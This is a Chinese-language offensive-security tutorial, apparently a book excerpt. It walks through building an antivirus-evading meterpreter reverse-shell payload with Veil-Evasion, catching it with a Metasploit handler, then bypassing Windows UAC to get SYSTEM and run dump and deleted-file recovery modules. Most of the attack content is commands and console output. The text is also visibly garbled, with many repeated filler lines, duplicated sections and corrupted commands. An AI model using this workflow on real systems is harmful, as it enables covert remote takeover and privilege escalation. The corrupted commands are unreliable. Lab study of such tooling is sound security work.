
# Show Veil configuration

# Update Veil

# Use a specific tool

```
Veil 提供两个工具：Evasion 和 Ordnance。我们想要运行 Veil-Evasion。

输入 `use 1`
```

```
Veil>: use 1

Veil-Evasion

[Web]: https://www.veil-framework.com/ | [Twitter]

Veil-Evasion Menu

  41 payloads loaded
```

Veil 的标题菜单板应该变为“Veil-Evasion”。

## 使用 Veil-Evasion

要做的第一件事是列出可用载荷。输入 `list` 然后按回车。

由于我们在本章中将讨论 PowerShell，我们需要目标计算机运行该文件。要使用载荷，我们需要“use”命令。使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

```
Veil-Evasion Menu

  41 payloads loaded
```

（此处）Veil 的标题菜单板应该变为“Veil-Evasion”。

## 使用 Veil-Evasion

要做的第一件事是列出可用载荷。输入 `list` 然后按回车。

由于我们在本章中将讨论 PowerShell，我们需要目标计算机运行该文件。要使用载荷，我们需要“use”命令。使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

| DOMAIN | X |
| HOSTNAME | X |
| LHOST | 192.168.1.39 |
| LPORT | 4444 |

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

（此处）使用 `meterpreter/reverse_tcp`。

## 获取远程 Shell

要创建远程处理器（handler），我们将使用 Metasploit。你可以使用 Veil 生成的 Metasploit 文件（`CutePuppy.rc`），但我更喜欢手动设置。

1. 从快速启动启动 Metasploit Framework。
2. 使用以下命令设置 `multi/handler`：

```
use multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.1.39

set LPORT 4444

exploit
```

确保输入你的 Kali 系统 IP 地址和输入 Veil 的端口。它们必须完全匹配。这启动了多处理器：

```
msf > use multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.39
LHOST => 192.168.1.39
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.1.39:4444
```

现在我们只需要目标计算机运行 Veil 生成的文件。如果你安装了 VMTools，你只需要从 Kali 目录将“CutePuppy.bat”文件复制并粘贴到你的 Windows 7 测试虚拟机的桌面上。

3. 将 `CutePuppy.bat` 复制到你的 Windows 桌面：

4. 现在，双击 `.bat` 文件运行它。
表面上看起来没有任何发生，但在你的 Kali 系统上，你应该看到以下内容：

```
[*] Started reverse TCP handler on 192.168.1.39:4444

[*] Sending stage (19779 bytes) to 192.168.1.93

[*] Meterpreter session 1 opened (192.168.1.39:4444 -> 192.168.1.93:56275)

18-05-20 14:17:16 -0400

meterpreter > 
```

这是一个反弹 Shell 会话！

5. 如果我们输入 `shell`，可以看到我们确实拥有了一个完整的远程 Shell：

```
meterpreter > shell

Process 3764 created.

Channel 1 created.

Microsoft Windows [Version 6.1.7600]

Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\Dan\Desktop>
```

我们现在拥有了一个可以控制受害者 Windows 7 系统的功能远程 Shell。我们将在下一章中使用这个 Shell。但大问题是，这个 Shell 能否绕过杀毒软件？在我写作期间，我在一个完全安装了补丁并运行了最新杀毒软件的 Windows 10 系统上运行基于 PowerShell 的 `CutePuppy.bat` 文件，它并没有将其检测为恶意软件：

| 威胁名称 | 路径 |
| :--- | :--- |
| Gen:Heur.BZC.Boxter.591.098277C9 | F\test\CutePuppy.bat |

杀毒软件引擎在检测基于 PowerShell 的威胁方面已经变得强大得多。在 Veil 中你还可以使用其他选项。我不会分步骤介绍它们，将此留给读者去探索，但使用提供的 `c/meterpreter/rev_tcp.py` payload 得到了不同的结果：

- 5) `c/meterpreter/rev_http.py`
- 6) `c/meterpreter/rev_http_service.py`
- 7) `c/meterpreter/rev_tcp.py`
- 8) `c/meterpreter/rev_tcp_service.py`

将其生成为 `test.exe` 文件：

```
-> Please enter the base name for output files (default payload): test

Veil-Evasion

[Web]: https://www.veil-framework.com // [Twitter]: @VeilFramework

[*] Language: c

[*] Payload Module: c/meterpreter/rev_tcp

[*] Executable written to: /var/lib/veil/output/compiled/test.exe

[*] Source code written to: /var/lib/veil/output/source/test.c

[*] Metasploit Resource file written to: /var/lib/veil/output/handlers/test.res
```

我们有了一个 Shell：

```
[*] Started reverse TCP handler on 192.168.1.39:4444

[*] Sending stage (179779 bytes) to 192.168.1.21

[*] Meterpreter session 2 opened (192.168.1.39:4444 -> 192.168.1.21:51933)

18-05-28 14:11:57 -0400

meterpreter > shell

Process 11944 created.

Channel 1 created.

Microsoft Windows [Version 10.0.17134.]

(C) 2018 Microsoft Corporation. All rights reserved.

D:\test\>
```

（提示：你可能需要在 Metasploit 中运行 `rexploit` 命令来重启多处理器。）

在本节中，我们演示了如何使用 Veil 创建能够绕过杀毒软件的 Shell。如果你对基于 PowerShell 的注入感兴趣，可以尝试 Magic Unicorn 攻击方法。

# 第 12 章：通过绕过 UAC 实现 Windows 权限提升

Windows 中的管理员账户拥有许多权限，但仍有一些是你即使是管理员也无法完成的。对于某些功能，你必须成为“System”用户才能获得完全控制。用户账户控制 (UAC) 也可以阻止安全测试人员想要实现的操作，包括运行 System 级任务。UAC 在旧版本的 Windows 中曾是一个麻烦，许多公司直接将其关闭了。UAC 在 Windows 7 及更高版本中运行得非常良好，即使开启最低的安全设置，也能防止在 Windows XP 中生效的攻击。

例如，即使我们在 Metasploit 中获得了一个远程管理员级会话，UAC 也会阻止我们执行诸如获取密码哈希值等操作。Meterpreter 中有 UAC 绕过模块，允许我们绕过此限制并获取 System 级访问——前提是受攻击的用户账户是管理员。在本节中，我们将学习如何通过绕过 UAC 将权限从管理员级用户提升到 System 级用户。

在本章中，我们将从一个与 Windows 7 系统和具有管理员权限用户的活动 Meterpreter 会话开始。为了简单起见，我们将使用上一章创建的会话。然后我们将使用 UAV 绕过将管理员级用户升级为 System 级账户。接下来，我们将介绍 `Recovery_Files` Metasploit 模块。该模块需要 System 级访问才能运行，并允许我们从远程系统恢复删除的文件。最后，简要介绍第二个绕过 UAC 的模块。

## 绕过 UAC 模块

Metasploit 中的几个工具需要 System 级访问才能正常工作。问题是 Windows 的 UAC 安全功能会阻止以提升提升的安全级别运行程序。Metasploit 中的 Bypass UAC 模块获取一个具有管理员权限用户的远程会话，并创建一个新会话，该会话可以通过 `getsystem` 命令提升到 System 级。

你可以使用上一章中的 `CutePuppy` 攻击。建议重启 Windows 7 虚拟机，退出并重启 Metasploit，这样攻击才能正常运行。如果不这样做，可能会在 Metasploit 中获得来自 Windows 7 系统的多个会话？

1. 运行 Metasploit 并启动 `multi/handler`。

```bash
msf > multi/handler

msf exploit(multi/handler) > payload windows/meterpreter/reverse_tcp

payload => windows/meterpreter/reverse_tcp

msf exploit(multi/handler) > set LHOST 192.168.1.39

msf exploit(multi/handler) > set LPORT 4444

LPORT => 4444

msf exploit(multi/handler) > exploit
```

2. 在你的 Windows 7 系统上双击 `CutePuppy.bat` 文件。
3. 如果你处于 Meterpreter 提示符处，输入 `background`。
4. 输入 `sessions` 查看你的活动会话。

如截图所示：

> [* Meterpreter session 1 opened (192.168.1.39:4444) => 192.168.1.93:49159)
[*] Meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > sessions

| Id | Name | Type | Information |
|---|---|---|---|
| 1 | meterpreter | x86/windows | WIN-420RBM3SRVF\Dan @ WIN-420RBM3SRVF |

```
msf exploit(multi/handler) > |
```

Metasploit 中有多个绕过 UAC 的模块。随着安全研究的进展和变化，你会发现曾经在某一点有效的模块现在不再起作用，你需要运行另一个。这只是安全测试中作为“猫鼠游戏”的正常组成部分。一个漏洞生效了，被补丁了，一个新的漏洞被创建了，等等。我们现在介绍一个绕过 UAC 的模块；第二个模块将在章末尾介绍。

在编写本文时，`Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)` 模块对 Windows 7 系统效果良好。它的运行非常简单，因为你在新模块中需要设置的只是活动会话。

5. 输入 `use exploit/windows/local/bypass_uac` 并按回车。
6. 接下来，输入 `show options`：

```bash
msf exploit(multi/handler) > use exploit/windows/local/bypass_uac

msf exploit(windows/local/bypass_uac) > show options
```

模块选项 (exploit/windows/local/bypass_uac):

| Name | Current Setting | Description |
|---|---|---|
| SESSION | yes | 运行此模块的会话。 |
| Exploit: | | |
| Id | 0 | Automatic |

7. 输入 `set SESSION 1`
8. 然后执行 `exploit` 将执行绕过 UAC 模块，创建一个禁用了 UAC 的新会话。

从上面的图中可以看到，Bypass UAC 模块运行并创建了 Session 2。最后，我们连接到该系统并处于 Meterpreter 提示符处。在 Meterpreter 提示符下输入 `getsystem` 然后输入 `getuid`：

```bash
meterpreter > getsystem

got system via (Named Pipe Impersonation)

meterpreter > getuid

username: NT AUTHORITY\SYSTEM
```

我们现在应该 Windows 系统上拥有了 System 级权限！现在我们已经从管理员级账户提升到了 System 级账户，我们可以访问 Windows 中某些受保护的区域。例如，使用 `post/windows/dump` 命令：

```bash
meterpreter > run post/windows/dump
```

### 从远程系统恢复删除的文件

Interpreter 中有很多模块可用。现在我们有了 System 访问，让我们看看如何使用一个模块恢复从磁盘删除的文件。`recovery_files` 脚本允许你恢复目标删除的文件。这可能非常有用，因为删除的文件可能包含感兴趣的信息。系统文件和日志、账户信息以及文档。为了准备这个示例，我只是在 Windows 7 系统上创建了一个虚假的 `Accounts Words.txt` 文件，并将 Nmap 的 `Discovery.pdf` 手动保存到连接到虚拟机的 NTFS 格式 U 盘上。该模块要求你对要检查的目标有一个打开的会话。我们将简单地使用上一节中获得的会话。一旦成功建立远程会话，我们需要将活动会话后台化，临时回到 ms 提示符，然后运行该模块。

输入 `background`，然后使用 `post/windows/gather/forensics/recovery_files`，最后输入 `show options`：

```bash
meterpreter > background session

execute -f c:\windows\samac\combinehack > post/windows/gather/forensics/recovery_files

post(post/windows/gather/forensics/recovery_files) > show options
```
